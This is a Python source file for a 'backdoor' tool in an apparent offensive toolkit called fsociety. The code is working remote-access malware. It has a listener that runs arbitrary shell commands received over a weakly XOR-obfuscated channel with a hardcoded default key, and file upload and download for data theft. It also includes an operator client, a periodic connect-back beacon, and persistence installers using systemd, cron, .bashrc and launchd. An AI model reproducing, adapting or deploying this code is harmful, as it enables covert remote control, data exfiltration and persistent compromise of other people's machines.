from __future__ import annotations

import base64
import hashlib
import json
import os
import socket
import struct
import threading
import time
from pathlib import Path

from fsociety.core.base import tool
from fsociety.core.logger import Log
from fsociety.core.utils import random_name

DEFAULT_KEY = "fsociety-2024"

@tool("backdoor", "Persistent TCP agent listener with encrypted command channel", category="research")
class Backdoor:
    @staticmethod
    def build_parser(p):
        sub = p.add_subparsers(dest="cmd", required=True)

        listen = sub.add_parser("listen", help="serve encrypted command channel")
        listen.add_argument("--host", default="0.0.0.0")
        listen.add_argument("--port", type=int, required=True)
        listen.add_argument("--key", default=DEFAULT_KEY)
        listen.add_argument("--ttl", type=float, default=0.0, help="auto-exit after N seconds")

        client = sub.add_parser("client", help="connect to the listener interactively")
        client.add_argument("--host", required=True)
        client.add_argument("--port", type=int, required=True)
        client.add_argument("--key", default=DEFAULT_KEY)

        install = sub.add_parser("install", help="write a persistent startup entry")
        install.add_argument("--name", default="fsociety-agent")
        install.add_argument("--command", required=True)
        install.add_argument("--method", default="systemd",
                             choices=["systemd", "cron", "profile", "launchd"])
        install.add_argument("--remove", action="store_true")

        beacon = sub.add_parser("beacon", help="periodic connect-back client")
        beacon.add_argument("--host", required=True)
        beacon.add_argument("--port", type=int, required=True)
        beacon.add_argument("--interval", type=float, default=30.0)
        beacon.add_argument("--key", default=DEFAULT_KEY)

    @staticmethod
    def _derive(key: str) -> bytes:
        return hashlib.sha256(key.encode()).digest()

    @staticmethod
    def _xor(data: bytes, key: bytes) -> bytes:
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

    @staticmethod
    def _send_frame(sock, data: bytes, key: bytes) -> None:
        encrypted = Backdoor._xor(data, key)
        sock.sendall(struct.pack("!I", len(encrypted)) + encrypted)

    @staticmethod
    def _recv_frame(sock, key: bytes) -> bytes:
        head = Backdoor._recv_exact(sock, 4)
        if not head:
            return b""
        size = struct.unpack("!I", head)[0]
        if size > 4 * 1024 * 1024:
            return b""
        payload = Backdoor._recv_exact(sock, size)
        return Backdoor._xor(payload, key)

    @staticmethod
    def _recv_exact(sock, n: int) -> bytes:
        buf = b""
        while len(buf) < n:
            chunk = sock.recv(n - len(buf))
            if not chunk:
                return b""
            buf += chunk
        return buf

    @staticmethod
    def _serve(args, log):
        key = Backdoor._derive(args.key)
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((args.host, args.port))
        srv.listen(5)
        deadline = time.time() + args.ttl if args.ttl else 0
        log.info(f"listening {args.host}:{args.port}")
        try:
            while not deadline or time.time() < deadline:
                srv.settimeout(1.0)
                try:
                    client, addr = srv.accept()
                except socket.timeout:
                    continue
                log.info(f"session from {addr[0]}:{addr[1]}")
                threading.Thread(target=Backdoor._session, args=(client, key, log),
                                 daemon=True).start()
        except KeyboardInterrupt:
            pass
        finally:
            srv.close()
        return 0

    @staticmethod
    def _session(sock, key, log):
        try:
            while True:
                frame = Backdoor._recv_frame(sock, key)
                if not frame:
                    break
                try:
                    msg = json.loads(frame)
                except json.JSONDecodeError:
                    continue
                action = msg.get("action", "shell")
                if action == "shell":
                    import subprocess
                    proc = subprocess.run(msg.get("cmd", ""),
                                          shell=True, capture_output=True, timeout=60)
                    reply = {"rc": proc.returncode,
                             "stdout": base64.b64encode(proc.stdout).decode(),
                             "stderr": base64.b64encode(proc.stderr).decode()}
                    Backdoor._send_frame(sock, json.dumps(reply).encode(), key)
                elif action == "upload":
                    dest = msg.get("path", "")
                    data = base64.b64decode(msg.get("data", ""))
                    Path(dest).write_bytes(data)
                    Backdoor._send_frame(sock, json.dumps({"ok": True, "path": dest}).encode(), key)
                elif action == "download":
                    src = msg.get("path", "")
                    try:
                        data = Path(src).read_bytes()
                        reply = {"ok": True, "data": base64.b64encode(data).decode()}
                    except OSError as exc:
                        reply = {"ok": False, "error": str(exc)}
                    Backdoor._send_frame(sock, json.dumps(reply).encode(), key)
                elif action == "sleep":
                    time.sleep(float(msg.get("seconds", 5)))
                    Backdoor._send_frame(sock, b'{"ok":true}', key)
                elif action == "exit":
                    break
        finally:
            sock.close()

    @staticmethod
    def _client(args, log):
        key = Backdoor._derive(args.key)
        sock = socket.create_connection((args.host, args.port), timeout=15)
        log.info(f"connected {args.host}:{args.port}")
        try:
            while True:
                try:
                    cmd = input("agent> ").strip()
                except EOFError:
                    break
                if not cmd:
                    continue
                if cmd in ("exit", "quit"):
                    Backdoor._send_frame(sock, json.dumps({"action": "exit"}).encode(), key)
                    break
                if cmd.startswith("upload "):
                    _, local, remote = cmd.split(" ", 2)
                    data = Path(local).read_bytes()
                    msg = {"action": "upload", "path": remote,
                           "data": base64.b64encode(data).decode()}
                elif cmd.startswith("download "):
                    _, remote = cmd.split(" ", 1)
                    msg = {"action": "download", "path": remote}
                else:
                    msg = {"action": "shell", "cmd": cmd}
                Backdoor._send_frame(sock, json.dumps(msg).encode(), key)
                reply_raw = Backdoor._recv_frame(sock, key)
                try:
                    reply = json.loads(reply_raw)
                except Exception:
                    print(reply_raw)
                    continue
                if "stdout" in reply:
                    print(base64.b64decode(reply["stdout"]).decode("utf-8", "ignore"), end="")
                    if reply.get("stderr"):
                        print(base64.b64decode(reply["stderr"]).decode("utf-8", "ignore"), end="")
                else:
                    print(json.dumps(reply, indent=2)[:400])
        finally:
            sock.close()
        return 0

    @staticmethod
    def _install(args, log):
        if args.method == "systemd":
            unit = Path(f"/etc/systemd/system/{args.name}.service")
            body = f"""[Unit]
Description={args.name}
[Service]
ExecStart={args.command}
Restart=always
[Install]
WantedBy=multi-user.target
"""
            if args.remove:
                if unit.exists():
                    unit.unlink()
                log.ok(f"removed {unit}")
                return 0
            unit.write_text(body)
            os.system("systemctl daemon-reload && systemctl enable --now " + args.name)
            log.ok(f"installed {unit}")
            return 0

        if args.method == "cron":
            cron = Path(f"/etc/cron.d/{args.name}")
            if args.remove:
                if cron.exists():
                    cron.unlink()
                log.ok(f"removed {cron}")
                return 0
            cron.write_text(f"*/5 * * * * root {args.command}\n")
            log.ok(f"installed {cron}")
            return 0

        if args.method == "profile":
            profile = Path.home() / ".bashrc"
            marker = f"# {args.name}"
            text = profile.read_text() if profile.exists() else ""
            if args.remove:
                new = "\n".join(l for l in text.splitlines() if marker not in l)
                profile.write_text(new)
                log.ok("profile entry removed")
                return 0
            profile.write_text(text + f"\n{marker}\n{args.command} &\n")
            log.ok(f"profile entry added to {profile}")
            return 0

        if args.method == "launchd":
            plist = Path.home() / f"Library/LaunchAgents/{args.name}.plist"
            plist.parent.mkdir(parents=True, exist_ok=True)
            if args.remove:
                if plist.exists():
                    plist.unlink()
                log.ok(f"removed {plist}")
                return 0
            body = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>{args.name}</string>
<key>ProgramArguments</key>
<array><string>/bin/sh</string><string>-c</string><string>{args.command}</string></array>
<key>RunAtLoad</key><true/>
<key>KeepAlive</key><true/>
</dict></plist>
"""
            plist.write_text(body)
            log.ok(f"installed {plist}")
            return 0
        return 2

    @staticmethod
    def _beacon(args, log):
        key = Backdoor._derive(args.key)
        while True:
            try:
                sock = socket.create_connection((args.host, args.port), timeout=10)
            except OSError:
                time.sleep(args.interval)
                continue
            try:
                msg = {"action": "shell", "cmd": "whoami"}
                Backdoor._send_frame(sock, json.dumps(msg).encode(), key)
                frame = Backdoor._recv_frame(sock, key)
                try:
                    reply = json.loads(frame)
                    log.info(f"beacon: {base64.b64decode(reply.get('stdout','')).decode().strip()}")
                except Exception:
                    pass
            finally:
                sock.close()
            time.sleep(args.interval)

    @staticmethod
    def run(args, log: Log) -> int:
        if args.cmd == "listen":
            return Backdoor._serve(args, log)
        if args.cmd == "client":
            return Backdoor._client(args, log)
        if args.cmd == "install":
            return Backdoor._install(args, log)
        if args.cmd == "beacon":
            return Backdoor._beacon(args, log)
        return 2
